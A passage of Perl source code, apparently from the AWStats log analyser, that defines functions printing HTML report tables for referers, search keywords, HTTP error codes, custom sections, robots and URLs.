<b>$FilterEx{'refererpages'}</b>\";\n\t\t}\n\t\tif ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {\n\t\t\tprint \": \";\n\t\t}\n\t\tprint \"$cpt $Message[28]\";\n\n\t\t#if ($MonthRequired ne 'all') {\n\t\t#\tif ($HTMLOutput{'refererpages'}) { print \"<br />$Message[102]: $TotalDifferentPages $Message[28]\"; }\n\t\t#}\n\t}\n\telse { print \"$Message[102]: \".Format_Number($cpt).\" $Message[28]\"; }\n\tprint \"</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint \"</tr>\\n\";\n\tmy $total_s = 0;\n\tmy $count = 0;\n\t&BuildKeyList(\n\t\t$MaxRowsInHTMLOutput,\n\t\t$MinHit{'Refer'},\n\t\t\\%_pagesrefs_h,\n\t\t(\n\t\t\t( scalar keys %_pagesrefs_p )\n\t\t\t? \\%_pagesrefs_p\n\t\t\t: \\%_pagesrefs_h\n\t\t)\n\t);\n\n\tforeach my $key (@keylist) {\n\t\tmy $nompage = CleanXSS($key);\n\t\tif ( length($nompage) > $MaxLengthOfShownURL ) {\n\t\t\t$nompage =\n\t\t\t  substr( $nompage, 0, $MaxLengthOfShownURL ) . \"...\";\n\t\t}\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($TotalRefererPages) {\n\t\t\t$p_p =\n\t\t\t  int( $_pagesrefs_p{$key} / $TotalRefererPages * 1000 ) /\n\t\t\t  10;\n\t\t}\n\t\tif ($TotalRefererHits) {\n\t\t\t$p_h =\n\t\t\t  int( $_pagesrefs_h{$key} / $TotalRefererHits * 1000 ) /\n\t\t\t  10;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($key);\n\t\tprint \"</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_pagesrefs_p{$key} ? Format_Number($_pagesrefs_p{$key}) : '&nbsp;' )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_pagesrefs_p{$key} ? \"$p_p %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_pagesrefs_h{$key} ? Format_Number($_pagesrefs_h{$key}) : '&nbsp;' )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_pagesrefs_h{$key} ? \"$p_h %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_pagesrefs_p{$key};\n\t\t$total_h += $_pagesrefs_h{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalRefererPages / $total_p - $TotalRefererHits / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalRefererPages - $total_p;\n\t$rest_h = $TotalRefererHits - $total_h;\n\tif ( $rest_p > 0 || $rest_h > 0 ) {\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($TotalRefererPages) {\n\t\t\t$p_p = int( $rest_p / $TotalRefererPages * 1000 ) / 10;\n\t\t}\n\t\tif ($TotalRefererHits) {\n\t\t\t$p_h = int( $rest_h / $TotalRefererHits * 1000 ) / 10;\n\t\t}\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\" . ( $rest_p ? \"$p_p %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\tprint \"<td>$p_h %</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Key Phrases frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowKeyPhrases{\n\tmy $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"keyphrases\\\">&nbsp;</a><br />\\n\";\n    my $title = \"$Message[43]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=SEARCHWORDS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\t&tab_head( $title, 19, 0, 'keyphrases' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t  . Tooltip(15)\n\t  . \"><th>\".Format_Number($TotalDifferentKeyphrases).\" $Message[103]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[14]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_s = 0;\n\tmy $count = 0;\n\t&BuildKeyList(\n\t\t$MaxRowsInHTMLOutput, $MinHit{'Keyphrase'},\n\t\t\\%_keyphrases,        \\%_keyphrases\n\t);\n\tforeach my $key (@keylist) {\n\t\tmy $mot;\n  \t\t# Convert coded keywords (utf8,...) to be correctly reported in HTML page.\n\t\tif ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {\n\t\t\t$mot = CleanXSS(\n\t\t\t\tDecodeKey_decodeutfkeys(\n\t\t\t\t\t$key, $PageCode || 'iso-8859-1'\n\t\t\t\t)\n\t\t\t);\n\t\t}\n\t\telse { $mot = CleanXSS( DecodeEncodedString($key) ); }\n\t\tmy $p;\n\t\tif ($TotalKeyphrases) {\n\t\t\t$p =\n\t\t\t  int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . XMLEncode($mot)\n\t\t  . \"</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\\n\";\n\t\t$total_s += $_keyphrases{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug( \"Total real / shown : $TotalKeyphrases / $total_s\", 2 );\n\t}\n\tmy $rest_s = $TotalKeyphrases - $total_s;\n\tif ( $rest_s > 0 ) {\n\t\tmy $p;\n\t\tif ($TotalKeyphrases) {\n\t\t\t$p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;\n\t\t}\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[124]</span></td><td>\".Format_Number($rest_s).\"</td>\";\n\t\t\t\tprint \"<td>$p %</td></tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Keywords frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowKeywords{\n\tmy $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"keywords\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[44]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=KEYWORDS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\t&tab_head( $title, 19, 0, 'keywords' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t  . Tooltip(15)\n\t  . \"><th>\".Format_Number($TotalDifferentKeywords).\" $Message[13]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[14]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_s = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Keyword'},\n\t\t\\%_keywords, \\%_keywords );\n\tforeach my $key (@keylist) {\n\t\tmy $mot;\n  \t\t# Convert coded keywords (utf8,...) to be correctly reported in HTML page.\n\t\tif ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {\n\t\t\t$mot = CleanXSS(\n\t\t\t\tDecodeKey_decodeutfkeys(\n\t\t\t\t\t$key, $PageCode || 'iso-8859-1'\n\t\t\t\t)\n\t\t\t);\n\t\t}\n\t\telse { $mot = CleanXSS( DecodeEncodedString($key) ); }\n\t\tmy $p;\n\t\tif ($TotalKeywords) {\n\t\t\t$p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . XMLEncode($mot)\n\t\t  . \"</td><td>$_keywords{$key}</td><td>$p %</td></tr>\\n\";\n\t\t$total_s += $_keywords{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug( \"Total real / shown : $TotalKeywords / $total_s\", 2 );\n\t}\n\tmy $rest_s = $TotalKeywords - $total_s;\n\tif ( $rest_s > 0 ) {\n\t\tmy $p;\n\t\tif ($TotalKeywords) {\n\t\t\t$p = int( $rest_s / $TotalKeywords * 1000 ) / 10;\n\t\t}\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[30]</span></td><td>\".Format_Number($rest_s).\"</td>\";\n\t\tprint \"<td>$p %</td></tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the HTTP Error code frame or static page\n# Parameters:   $code - the error code we're printing\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowErrorCodes{\n\tmy $code = shift;\n\tmy $title;\n\tmy %customtitles = ( \"404\", \"$Message[47]\" );\n\t$title = $customtitles{$code} ? $customtitles{$code} :\n\t           (join(' ', ( ($httpcodelib{$code} ? $httpcodelib{$code} :\n\t           'Unknown error'), \"urls (HTTP code \" . $code . \")\" )));\n\tprint \"$Center<a name=\\\"errors$code\\\">&nbsp;</a><br />\\n\";\n\t&tab_head( $title, 19, 0, \"errors$code\" );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>URL (\"\n\t  . Format_Number(( scalar keys %{$_sider_h{$code}} ))\n\t  . \")</th><th bgcolor=\\\"#$color_h\\\">$Message[49]</th>\";\n\tforeach (split(//, $ShowHTTPErrorsPageDetail)) {\n\t\tif ( $_ =~ /R/i ) {\n\t\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[23]</th>\";\n\t\t} elsif ( $_ =~ /H/i ) {\n\t\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[81]</th>\";\n\t\t}\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_h = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%{$_sider_h{$code}},\n\t\t\\%{$_sider_h{$code}} );\n\tforeach my $key (@keylist) {\n\t\tmy $nompage = XMLEncode( CleanXSS($key) );\n\n\t\t#if (length($nompage)>$MaxLengthOfShownURL) { $nompage=substr($nompage,0,$MaxLengthOfShownURL).\"...\"; }\n\t\tmy $referer = XMLEncode( CleanXSS( $_referer_h{$code}{$key} ) );\n\t\tmy $host = XMLEncode( CleanXSS( $_err_host_h{$code}{$key} ) );\n\t\tprint \"<tr><td class=\\\"aws\\\">$nompage</td>\";\n\t\tprint \"<td>\".Format_Number($_sider_h{$code}{$key}).\"</td>\";\n\t\tforeach (split(//, $ShowHTTPErrorsPageDetail)) {\n\t\t\tif ( $_ =~ /R/i ) {\n\t\t\t\tprint \"<td class=\\\"aws\\\">\" . ( $referer ? \"$referer\" : \"&nbsp;\" ) . \"</td>\";\n\t\t\t} elsif ( $_ =~ /H/i ) {\n\t\t\t\tprint \"<td class=\\\"aws\\\">\" . ( $host ? \"$host\" : \"&nbsp;\" ) . \"</td>\";\n\t\t\t}\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tmy $total_s += $_sider_h{$code}{$key};\n\t\t$count++;\n\t}\n\n# TODO Build TotalErrorHits\n#\t\t\tif ($Debug) { debug(\"Total real / shown : $TotalErrorHits / $total_h\",2); }\n#\t\t\t$rest_h=$TotalErrorHits-$total_h;\n#\t\t\tif ($rest_h > 0) {\n#\t\t\t\tmy $p;\n#\t\t\t\tif ($TotalErrorHits) { $p=int($rest_h/$TotalErrorHits*1000)/10; }\n#\t\t\t\tprint \"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[30]</span></td>\";\n#\t\t\t\tprint \"<td>$rest_h</td>\";\n#\t\t\t\tprint \"<td>...</td>\";\n#\t\t\t\tprint \"</tr>\\n\";\n#\t\t\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Loops through any defined extra sections and dumps the info to HTML\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowExtraSections{\n\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\tmy $total_p = 0;\n\t\tmy $total_h = 0;\n\t\tmy $total_k = 0;\n\t\t\n\t\tif ( $HTMLOutput{\"allextra$extranum\"} ) {\n\t\t\tif ($Debug) { debug( \"ExtraName$extranum\", 2 ); }\n\t\t\tprint \"$Center<a name=\\\"extra$extranum\\\">&nbsp;</a><br />\";\n\t\t\tmy $title = $ExtraName[$extranum];\n\t\t\t&tab_head( \"$title\", 19, 0, \"extra$extranum\" );\n\t\t\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\t\t\tprint \"<th>\" . $ExtraFirstColumnTitle[$extranum] . \"</th>\";\n\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t\t\t}\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\t\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t\t\t}\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t\t\t}\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$total_p = $total_h = $total_k = 0;\n\n #$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }\n #$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }\n\t\t\tmy $count = 0;\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\t&BuildKeyList(\n\t\t\t\t\t$MaxRowsInHTMLOutput,\n\t\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\t\\%{ '_section_' . $extranum . '_p' }\n\t\t\t\t);\n\t\t\t}\n\t\t\telse {\n\t\t\t\t&BuildKeyList(\n\t\t\t\t\t$MaxRowsInHTMLOutput,\n\t\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\t\\%{ '_section_' . $extranum . '_h' }\n\t\t\t\t);\n\t\t\t}\n\t\t\tmy %keysinkeylist = ();\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\t$keysinkeylist{$key} = 1;\n\t\t\t\tmy $firstcol = CleanXSS( DecodeEncodedString($key) );\n\t\t\t\t$total_p += ${ '_section_' . $extranum . '_p' }{$key};\n\t\t\t\t$total_h += ${ '_section_' . $extranum . '_h' }{$key};\n\t\t\t\t$total_k += ${ '_section_' . $extranum . '_k' }{$key};\n\t\t\t\tprint \"<tr>\";\n\t\t\t\tprintf(\n\"<td class=\\\"aws\\\">$ExtraFirstColumnFormat[$extranum]</td>\",\n\t\t\t\t\t$firstcol, $firstcol, $firstcol, $firstcol, $firstcol );\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . ${ '_section_' . $extranum . '_p' }{$key} . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . ${ '_section_' . $extranum . '_h' }{$key} . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . Format_Bytes(\n\t\t\t\t\t\t${ '_section_' . $extranum . '_k' }{$key} )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . (\n\t\t\t\t\t\t${ '_section_' . $extranum . '_l' }{$key}\n\t\t\t\t\t\t? Format_Date(\n\t\t\t\t\t\t\t${ '_section_' . $extranum . '_l' }{$key}, 1 )\n\t\t\t\t\t\t: '-'\n\t\t\t\t\t  )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t$count++;\n\t\t\t}\n\n\t\t\t# If we ask average or sum, we loop on all other records\n\t\t\tif (   $ExtraAddAverageRow[$extranum]\n\t\t\t\t|| $ExtraAddSumRow[$extranum] )\n\t\t\t{\n\t\t\t\tforeach ( keys %{ '_section_' . $extranum . '_h' } ) {\n\t\t\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\t\t\t$total_p += ${ '_section_' . $extranum . '_p' }{$_};\n\t\t\t\t\t$total_h += ${ '_section_' . $extranum . '_h' }{$_};\n\t\t\t\t\t$total_k += ${ '_section_' . $extranum . '_k' }{$_};\n\t\t\t\t\t$count++;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Add average row\n\t\t\tif ( $ExtraAddAverageRow[$extranum] ) {\n\t\t\t\tprint \"<tr>\";\n\t\t\t\tprint \"<td class=\\\"aws\\\"><b>$Message[96]</b></td>\";\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . ( $count ? Format_Number(( $total_p / $count )) : \"&nbsp;\" )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . ( $count ? Format_Number(( $total_h / $count )) : \"&nbsp;\" )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . (\n\t\t\t\t\t\t$count\n\t\t\t\t\t\t? Format_Bytes( $total_k / $count )\n\t\t\t\t\t\t: \"&nbsp;\"\n\t\t\t\t\t  )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t}\n\n\t\t\t# Add sum row\n\t\t\tif ( $ExtraAddSumRow[$extranum] ) {\n\t\t\t\tprint \"<tr>\";\n\t\t\t\tprint \"<td class=\\\"aws\\\"><b>$Message[102]</b></td>\";\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\t\tprint \"<td>\" . ($total_p) . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\t\t\tprint \"<td>\" . ($total_h) . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\t\t\tprint \"<td>\" . Format_Bytes($total_k) . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t}\n\t\t\t&tab_end();\n\t\t\t&html_end(1);\n\t\t}\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Robot details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowRobots{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $total_r = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tmy $rest_r = 0;\n\t\n\tprint \"$Center<a name=\\\"robots\\\">&nbsp;</a><br />\\n\";\n\tmy $title = '';\n\tif ( $HTMLOutput{'allrobots'} )  { $title .= \"$Message[53]\"; }\n\tif ( $HTMLOutput{'lastrobots'} ) { $title .= \"$Message[9]\"; }\n\t&tab_head( \"$title\", 19, 0, 'robots' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\"\n\t  . Format_Number(( scalar keys %_robot_h ))\n\t  . \" $Message[51]</th>\";\n\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowRobotsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\t$total_p = $total_h = $total_k = $total_r = 0;\n\tmy $count = 0;\n\tif ( $HTMLOutput{'allrobots'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},\n\t\t\t\\%_robot_h, \\%_robot_h );\n\t}\n\tif ( $HTMLOutput{'lastrobots'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},\n\t\t\t\\%_robot_h, \\%_robot_l );\n\t}\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )\n\t\t  . \"</td>\";\n\t\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_robot_h{$key} - $_robot_r{$key} ))\n\t\t\t  . ( $_robot_r{$key} ? \"+$_robot_r{$key}\" : \"\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_robot_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_robot_l{$key}\n\t\t\t\t? Format_Date( $_robot_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_robot_p{$key}||0;\n\t\t$total_h += $_robot_h{$key};\n\t\t$total_k += $_robot_k{$key} || 0;\n\t\t$total_r += $_robot_r{$key} || 0;\n\t\t$count++;\n\t}\n\n\t# For bots we need to count Totals\n\tmy $TotalPagesRobots =\n\t  0;    #foreach (values %_robot_p) { $TotalPagesRobots+=$_; }\n\tmy $TotalHitsRobots = 0;\n\tforeach ( values %_robot_h ) { $TotalHitsRobots += $_; }\n\tmy $TotalBytesRobots = 0;\n\tforeach ( values %_robot_k ) { $TotalBytesRobots += $_; }\n\tmy $TotalRRobots = 0;\n\tforeach ( values %_robot_r ) { $TotalRRobots += $_; }\n\t$rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;\n\t$rest_h = $TotalHitsRobots - $total_h;\n\t$rest_k = $TotalBytesRobots - $total_k;\n\t$rest_r = $TotalRRobots - $total_r;\n\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPagesRobots / $total_p - $TotalHitsRobots / $total_h - $TotalBytesRobots / $total_k\",\n\t\t\t2\n\t\t);\n\t}\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 || $rest_r > 0 )\n\t{               # All other robots\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowRobotsStats =~ /H/i ) { print \"<td>\".Format_Number($rest_h).\"</td>\"; }\n\t\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . ( Format_Bytes($rest_k) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end(\n\t\t\"* $Message[156]\" . ( $TotalRRobots ? \" $Message[157]\" : \"\" ) );\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the URL, Entry or Exit details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowURLDetail{\n\tmy $total_p = 0;\n\tmy $total_e = 0;\n\tmy $total_k = 0;\n\tmy $total_x = 0;\n\t# Call to plugins' function ShowPagesFilter\n\tforeach\n\t  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesFilter'} } )\n\t{\n\t\tmy $function = \"ShowPagesFilter_$pluginname\";\n\t\t&$function();\n\t}\n\tprint \"$Center<a name=\\\"urls\\\">&nbsp;</a><br />\\n\";\n\n\t# Show filter form\n\t&HTMLShowFormFilter( \"urlfilter\", $FilterIn{'url'}, $FilterEx{'url'} );\n\n\t# Show URL list\n\tmy $title = '';\n\tmy $cpt   = 0;\n\tif ( $HTMLOutput{'urldetail'} ) {\n\t\t$title = $Message[19];\n\t\t$cpt   = ( scalar keys %_url_p );\n\t}\n\tif ( $HTMLOutput{'urlentry'} ) {\n\t\t$title = $Message[104];\n\t\t$cpt   = ( scalar keys %_url_e );\n\t}\n\tif ( $HTMLOutput{'urlexit'} ) {\n\t\t$title = $Message[116];\n\t\t$cpt   = ( scalar keys %_url_x );\n\t}\n\t&tab_head( \"$title\", 19, 0, 'urls' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\";\n\tif ( $FilterIn{'url'} || $FilterEx{'url'} ) {\n\t\tif ( $FilterIn{'url'} ) {\n\t\t\tprint \"$Message[79] <b>$FilterIn{'url'}</b>\";\n\t\t}\n\t\tif ( $FilterIn{'url'} && $FilterEx{'url'} ) { print \" - \"; }\n\t\tif ( $FilterEx{'url'} ) {\n\t\t\tprint \"Exclude $Message[79] <b>$FilterEx{'url'}</b>\";\n\t\t}\n\t\tif ( $FilterIn{'url'} || $FilterEx{'url'} ) { print \": \"; }\n\t\tprint Format_Number($cpt).\" $Message[28]\";\n\t\tif ( $MonthRequired ne 'all' ) {\n\t\t\tif ( $HTMLOutput{'urldetail'} ) {\n\t\t\t\tprint\n\"<br />$Message[102]: \".Format_Number($TotalDifferentPages).\" $Message[28]\";\n\t\t\t}\n\t\t}\n\t}\n\telse { print \"$Message[102]: \".Format_Number($cpt).\" $Message[28]\"; }\n\tprint \"</th>\";\n\tif ( $ShowPagesStats =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[29]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /E/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_e\\\" width=\\\"80\\\">$Message[104]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /X/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_x\\\" width=\\\"80\\\">$Message[116]</th>\";\n\t}\n\n\t# Call to plugins' function ShowPagesAddField\n\tforeach\n\t  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t{\n\n\t\t#    \t\t\tmy $function=\"ShowPagesAddField_$pluginname('title')\";\n\t\t#    \t\t\teval(\"$function\");\n\t\tmy $function = 